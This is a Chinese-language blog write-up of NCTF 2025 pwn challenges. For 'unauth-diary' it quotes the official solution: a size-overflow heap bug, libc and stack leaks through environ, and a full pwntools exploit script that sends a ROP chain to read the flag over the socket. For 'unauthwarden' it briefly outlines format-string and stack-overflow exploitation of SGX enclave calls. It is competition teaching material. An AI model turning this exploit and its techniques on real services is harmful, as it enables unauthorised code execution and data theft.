---
title: NCTF PWN WP
date: '2025-03-22 22:25:26'
updated: '2025-04-07 21:33:51'
---
NCTF 好恐怖的强度

## unauth-diary
先是 checksec：

![](/images/f4ae5b0d0adc9db415182c3d04cfdfa9.png)

从来没见过全部绿色的题目，真的被吓到了...这怎么搞

![](/images/bf89aa307bcfb1c7fe1c3362ee708d1e.png)

又是用了 socket 的题目，先让我回去看看之前查的资料

本地 0.0.0.0 端口 9999 连上去看：

![](/images/39747fed600c4500892badcfbb477a56.png)

第一次见 libc 版本这么新的堆题，

题目限制了最多只能有 0xf 也就是 15 个 chunk

![](/images/9739e631121eb91b0a9e99f78941b2dd.png)

第一眼看见两个 free 还怀疑是不是 IDA 逆向错了，换去汇编界面仔细看了一眼还真是两个 free，涉及到好多指针，刚开始看不过来

后面再看了看 add 的具体过程，它是先 malloc 了一块 0x10 大小的 chunk 来存真正要存数据的 chunk 的地址和申请大小（前八字节是地址，后八字节是申请大小），所以一共用到了两次 malloc，所以 delete 那里就有两次 free，不存在 UAF

edit 函数也没有溢出，show 函数也没发现利用点...真的是头大，没有下手点

## 官方 WP
### Unauth-diary 
> 没注意到出题时跟release版本不同，给各位师傅带来了不好的体验，再次给各位师傅磕⼀个
>

⾸先要知道 `malloc(0)` 的⾏为是`malloc(0x20)`   且malloc函数的参数类型是`size_t` 即 `unsigned int` ，4byte。然后程序中存堆结构信息的size部分是8byte，输⼊为4byte，且malloc(size+1)，这⾥假设输⼊size为 `0xffffffff` ，+1后就会导致溢出，进⽽ `malloc(0)`但存储的size为 `0x100000000` 。 后期利⽤的话，由于本题是基于fork的server，不能直接 `system("/bin/sh")` 。 我⾃⼰测试的时候是漏env打栈，直接从没关的socket⾥⾯做orw。 赛中来问我的⼏位⼏乎全都在打io，io由于在exit前socket会被关掉，只能弹flag/shell。 两种打法都要控制rdx的gadget，这个好办，随便找⼀下就⾏了。但打IO需要的magic_gadget可能要费点事。 

#### exp-environ-stack
```python
from pwn import *
	context(arch="amd64", os="linux", log_level="DEBUG")
	s=remote("39.106.16.204",25289)
	libc=ELF("./2libc.so.6")
	def menu(ch):
	s.sendlineafter(b"> ",str(ch).encode())
	def add(size,content=b"/home/ctf/flag\x00"):
	menu(1)
	s.sendlineafter(b"length:\n",str(size).encode())
	s.sendlineafter(b"content:\n",content)
def delete(idx):
	menu(2)
	s.sendlineafter(b"index:\n",str(idx).encode())
def edit(idx,content):
	menu(3)
	s.sendlineafter(b"index:\n",str(idx).encode())
	s.sendlineafter(b"content:\n",content)
def show(idx):
	menu(4)
	s.sendlineafter(b"index:\n",str(idx).encode())
	s.recvuntil(b"Content:\n")
	return #s.recvline()[:-1]
if __name__=="__main__":
	add(0x30)
	add(0xffffffff)
	add(0x80)
	add(0x80)
	edit(1,b"a"*0x20)
	show(2)
	dat=s.recv(8)
	heap_base=u64(dat)-0x320
	success(hex(heap_base))
	delete(1)
	add(0x2000000)
	show(2)
	dat=s.recv(8)
	libc.address=u64(dat)-0x10+0x2001000
	edit(2,p64(libc.sym.environ)+p64(9))
	success(hex(libc.address))
	show(1)
	dat=s.recv(8)
	stack=u64(dat)
	success(hex(stack))
	edit(2,p64(stack-0x2c0)+p64(0x1000))
	rroopp=ROP(libc)
	rdi=libc.address+0x000000000010f75b
	rsi_rbp=libc.address+0x000000000002b46b
	# rbx=libc.address+0x00000000000586e4
	rbx_rbp=libc.address+0x0000000000114d3a
	# 0x00000000000b0133 : mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret
	magic=libc.address+0x00000000000b0133
	rop_chain=flat([
		rdi,heap_base+0x2c0,
		rsi_rbp,0,0,
		rbx_rbp,0,0,
		magic,0x100,0,0,
		libc.sym.open,
		rdi,3,
		rsi_rbp,heap_base+0x1000,0,
		magic,0x100,0,0,
		libc.sym.read,
		rdi,4,
		libc.sym.write,
	])
	show(1)
	edit(1,rop_chain)
	s.interactive()
```

### unauthwarden
漏洞为ecall_print_username中的fmt和ecall_do_seal_send中的栈溢出。

whoami泄露root密码，

直接构造 `pop rdi; ret; printf(root_password)` 即可。

reveal的正解就是复现论⽂中的⼿法。

但赛中的唯⼀解Laogong直接偷了：

+  ocall_read_user("root.data",len,buffer)
+  unseal_buffer(buffer,len,unsealed_buffer,len)
+  printf(unsealed_buffer)

只能说偷的好啊。

